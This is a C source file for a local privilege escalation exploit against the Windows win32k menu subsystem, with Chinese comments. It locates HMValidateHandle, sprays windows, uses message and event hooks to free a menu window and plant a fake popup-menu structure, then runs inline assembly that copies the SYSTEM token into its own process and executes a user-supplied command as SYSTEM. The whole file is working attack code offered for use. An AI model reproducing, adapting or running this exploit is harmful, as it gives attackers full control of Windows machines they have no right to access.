#include<stdio.h>
#include<stdlib.h>
#include<windows.h>

#define MN_OPENHIERARCHY 0x1E3
#define MN_SELECTFIRSTVALIDITEM 0x1E7
#define MN_SELECTITEM 0x1E5
#define WM_UNINITMENUPOPUP 0x125
#define MN_CANCELMENUS          0x01E6
#define WM_FREE_HEAP          0x1998
#define WM_ATTACK 0x1999

#define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
#define PROCESS_LINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
#define SYSTEM_PID         0x004  // SYSTEM Process PID

typedef struct _THRDESKHEAD {
	HANDLE  h;
	DWORD   cLockObj;
	PVOID   pti;
	PVOID   rpdesk;
	PBYTE   pSelf;
} THRDESKHEAD, * PTHRDESKHEAD;

typedef PVOID(__fastcall* HMValidateHandle_t)(HANDLE, UINT);

HMValidateHandle_t HMValidateHandle = 0;

static BOOLEAN g_bIsAttacked = FALSE;
static HHOOK g_hHook = 0;
static HWND g_hWndList[0x100] = { 0 };
static HMENU g_hRootMenu = 0;
static HMENU g_hSubMenu = 0;
static UINT g_Counts = 0;
static BOOLEAN g_bIsFirst = TRUE;
static HMENU g_hMenuDest = 0;
static HWND g_hAttackWnd = 0;
static HMENU g_MN_Sub = 0;
static HWND g_hWndMain = 0;
static PDWORD g_spMem = NULL;
static PDWORD g_spCls[0x100] = { 0 };
static PVOID g_spNextPopupMenu=0;

BOOLEAN Init() {
	int offset = 0;
	DWORD next_code = 0;
	for (int i = 0; i < 0x100; i++) {
		PUCHAR tr = (PUCHAR)IsMenu + i;
		if (*tr == 0xE8)
		{//找到调用HMValidateHandle的指令位置
			offset = *(int*)((PCHAR)IsMenu + i + 1);
			next_code = (DWORD)IsMenu + i + 5;
			HMValidateHandle = (HMValidateHandle_t)(next_code + offset);
			break;
		}
	}
	if (!HMValidateHandle) {
		printf("[!]Error: Can not find HMValidateHandle!\n");
		return FALSE;
	}
	printf("[+]Found HMValidateHandle = 0x%p\n", HMValidateHandle);
	return TRUE;
}

static 
VOID 
CALLBACK 
WndEventProc(
	HWINEVENTHOOK hWinEventHook,
	DWORD         event,
	HWND          hwnd,
	LONG          idObject,
	LONG          idChild,
	DWORD         idEventThread,
	DWORD         dwmsEventTime
) {
	if (g_bIsAttacked)return;

	if (g_Counts == 0) {
		g_hRootMenu = (HMENU)hwnd;
		printf("[+]g_hRootMenu = 0x%p\n", g_hRootMenu);
	}
	else if (g_Counts == 1) {
		g_hSubMenu = (HMENU)hwnd;
		printf("[+]g_hSubMenu = 0x%p\n", g_hSubMenu);
	}
	++g_Counts;
	//模拟鼠标选择菜单项
	SendMessageW(hwnd, MN_SELECTITEM, 0, 0);
	SendMessageW(hwnd, MN_SELECTFIRSTVALIDITEM, 0, 0);
	PostMessageW(hwnd, MN_OPENHIERARCHY, 0, 0);
}

VOID FakePopupMenu() {
	DWORD payload[0xD] = { 0 };

	payload[0] = ~(1 << 16);
	payload[1] = (DWORD)g_spMem;//spwndNotify
	payload[2] = (DWORD)g_spMem;//spwndPopupMenu
	payload[3] = (DWORD)g_spNextPopupMenu;//spwndNextPopup
	payload[4] = (DWORD)g_spMem;//spwndPrevPopup
	payload[5] = (DWORD)g_spMem;//spmenu
	payload[6] = (DWORD)g_spMem;//spmenuAlternate
	payload[7] = (DWORD)g_spMem;//spwndActivePopup
	payload[8] = (DWORD)-1;//ppopupmenuRoot
	payload[9] = (DWORD)-1;//ppmDelayedFree
	payload[0xA] = (DWORD)-1;//posSelectedItem
	payload[0xB] = (DWORD)g_spMem;//posDropped
	payload[0xC] = 0;
	
	for (int i = 0; i < 0x100; i++) {
		SetClassLongPtrW(g_hWndList[i], GCL_MENUNAME, (LONG)payload);
	}
}

static LRESULT CALLBACK  WndHookProc(INT code, WPARAM wParam, LPARAM lParam) {
	PCWPSTRUCT spCwp = (PCWPSTRUCT)lParam;

	if (!g_bIsAttacked) {
		if (spCwp->message == WM_NCCREATE &&
			g_hMenuDest == NULL &&
			g_hRootMenu && !g_hSubMenu) 
		{
			g_hMenuDest =(HMENU) spCwp->hwnd;
			printf("[+]WM_NCCREATE\n");
			printf("[+]g_hMenuDest = 0x%p\n", g_hMenuDest);
			SendMessageW((HWND)g_hRootMenu, MN_CANCELMENUS, 0, 0);
			PostMessageW(g_hWndMain, WM_FREE_HEAP, 0, 1);
		}
		else if (spCwp->message == WM_UNINITMENUPOPUP &&
			g_bIsFirst &&
			g_MN_Sub == (HMENU)spCwp->wParam) {
			printf("[+]WM_UNINITMENUPOPUP\n");

			g_bIsFirst = FALSE;
			DestroyWindow((HWND)g_hMenuDest);
			//构造popupmenu
			FakePopupMenu();
		}
	}
	
	return CallNextHookEx(g_hHook,code,wParam,lParam);
}

static  LRESULT WINAPI MainWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
	if (msg == WM_FREE_HEAP) {
		printf("[+]WM_FREE_HEAP\n");
		DestroyWindow((HWND)g_hMenuDest);
		SendMessageW(g_hAttackWnd, WM_ATTACK, 0, 0);
	}

	return DefWindowProcW(hwnd, msg, wParam, lParam);
}

static LRESULT CALLBACK  AttackPayload(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
	
	if (msg != WM_ATTACK  || g_bIsAttacked)return (LRESULT)1;

	USHORT cv = 0;
	__asm {
		mov ax,cs
		mov cv,ax
	}
	if(cv==0x1B)return (LRESULT)1;
	//首先做一下防止蓝屏的处理
	for (int i = 0; i < 0x100; i++) {
		*(PDWORD)((PBYTE)g_spCls[i] + 0x50) = 0;
	}

	__asm {
		pushad; 保存堆栈状态
		xor eax, eax
		mov eax, fs: [eax + KTHREAD_OFFSET] ; 获取当前进程对象 _EPROCESS
		mov eax, [eax + EPROCESS_OFFSET]
		mov ebx, eax; ebx保存的是当前进程的_EPROCESS
		mov ecx, SYSTEM_PID

		; 开始搜索system进程的_EPROCESS
		SearchSystemPID :
			mov eax, [eax + PROCESS_LINK_OFFSET]
			sub eax, PROCESS_LINK_OFFSET
			cmp[eax + PID_OFFSET], ecx; 判断是否是system的PID
			jne SearchSystemPID

		; 如果是则开始将当前进程的TOKEN替换程system的TOKEN
		mov edx, [eax + TOKEN_OFFSET]; 取得system的TOKEN
		mov[ebx + TOKEN_OFFSET], edx; 替换当前进程的TOKEN
		popad; 恢复堆栈状态
	}
	g_bIsAttacked = TRUE;
	return (LRESULT)WM_ATTACK;
}

static DWORD WINAPI Exploit_Thread(LPVOID lParam) {
	HMENU MN_Root = CreateMenu();
	 g_MN_Sub= CreateMenu();
	AppendMenuA(MN_Root, MF_MOUSESELECT | MF_POPUP, (UINT_PTR)g_MN_Sub, "item");
	AppendMenuA(g_MN_Sub, MF_MOUSESELECT | MF_POPUP, 0, "item");

	printf("[+]MN_Root = 0x%p\n", MN_Root);
	printf("[+]g_MN_Sub = 0x%p\n", g_MN_Sub);

	WNDCLASSEXW wcs = { 0 };
	wcs.cbSize = sizeof(WNDCLASSEXW);
	wcs.lpfnWndProc = DefWindowProcW;
	wcs.lpszMenuName = NULL;
	wcs.cbWndExtra = 0;
	wcs.hInstance = GetModuleHandleA(0);

	//分配一个内存用来伪造tagWND结构体
	g_spMem = (PDWORD)LocalAlloc(LMEM_ZEROINIT, 0x100);
	if (!g_spMem) {
		printf("[!]Error:%d\n", __LINE__ - 2);
		return 0;
	}

	//创建256个窗口，为后面UFA做铺垫
	for (int i = 0; i < 0x100; ) {
		WCHAR wzClsName[0x20] = { 0 };
		wsprintfW(wzClsName, L"%d", (i + 1) * 1998);
		wcs.lpszClassName = wzClsName;
		if (!RegisterClassExW(&wcs)) {
			continue;
		}
		HWND hTmp = CreateWindowExW(
			NULL ,
			wzClsName,
			NULL,
			WS_OVERLAPPED,
			0, 0, 1, 1, NULL, 0, GetModuleHandleA(0), 0
		);
		if (!hTmp) {
			continue;
		}

		////记录每个窗口的内核tagCls指针
		g_spCls[i] = *(PDWORD*)((PBYTE)HMValidateHandle(hTmp, 1) + 0x64);

		g_hWndList[i++] = hTmp;
	}

	wcs.lpfnWndProc = (WNDPROC)MainWndProc;
	wcs.lpszClassName = L"Main";
	if (!RegisterClassExW(&wcs)) {
		printf("[!]Error:%d\n",__LINE__-1);
		return 0;
	}
	//创建一个承载菜单的主窗口
	g_hWndMain = CreateWindowExW(
		WS_EX_LAYERED | WS_EX_TOOLWINDOW | WS_EX_TOPMOST,
		L"Main",
		NULL,
		WS_VISIBLE,
		0,0,1,1,NULL,0,GetModuleHandleA(0),0
	);
	if (!g_hWndMain) {
		printf("[!]Error:%d\n", __LINE__ - 2);
		return 0;
	}
	//创建一个用于攻击的窗口
	wcs.lpfnWndProc = (WNDPROC)AttackPayload;
	wcs.lpszClassName = L"Attack";
	wcs.cbWndExtra = 0;
	if (!RegisterClassExW(&wcs)) {
		printf("[!]Error:%d\n", __LINE__ - 2);
		return 0;
	}

	g_hAttackWnd = CreateWindowExW(
		WS_EX_LEFT,
		L"Attack",
		NULL,
		WS_OVERLAPPED,
		0, 0, 1, 1, NULL, 0, GetModuleHandleA(0), 0
	);
	if (!g_hAttackWnd) {
		printf("[!]Error:%d\n", __LINE__ - 2);
		return 0;
	}
	PTHRDESKHEAD tagWndInUser = (PTHRDESKHEAD)HMValidateHandle(g_hAttackWnd, 1);

	//tagWND->head.pti
	((PTHRDESKHEAD)g_spMem)->pti = tagWndInUser->pti;
	//tagWND->state
	g_spMem[0x14 / 4] |=(DWORD)(1<18);
	g_spNextPopupMenu = *(PBYTE*)((PBYTE)HMValidateHandle(g_hAttackWnd,1) + 0x10) + 0x12;
	//设置消息钩子
	g_hHook = SetWindowsHookExW(WH_CALLWNDPROC, WndHookProc, GetModuleHandleA(0), GetCurrentThreadId());
	//设置事件钩子程序
	SetWinEventHook(EVENT_SYSTEM_MENUPOPUPSTART, EVENT_SYSTEM_MENUPOPUPSTART,
		GetModuleHandleA(NULL),
		WndEventProc,
		GetCurrentProcessId(),
		GetCurrentThreadId(),
		0);

	TrackPopupMenuEx(MN_Root, 0, 0, 0, g_hWndMain, NULL);

	MSG msg = { 0 };
	while (GetMessageW(&msg, NULL, 0, 0) && !g_bIsAttacked)
	{
		TranslateMessage(&msg);
		DispatchMessageW(&msg);
	}

	return 1;
}

int main(int argc,char **argv) {
	if (!Init()) {
		printf("[!]Error:%d\n", __LINE__ - 1);
		return 1;
	}
	//创建攻击线程
	HANDLE hThread = CreateThread(0, 0, Exploit_Thread, 0, 0, 0);
	if (!hThread) {
		printf("[!]Error:%d\n",__LINE__-2);
		return 1;
	}

	//等待攻击线程执行完毕
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);

	if (!g_bIsAttacked) {
		printf("[*]Attack failed!\n");
		return 1;
	}
	//攻击成功
	printf("\n\n[*]Try execute %s as SYSTEM!\n", argv[1]);
	system(argv[1]);

	return 0;
}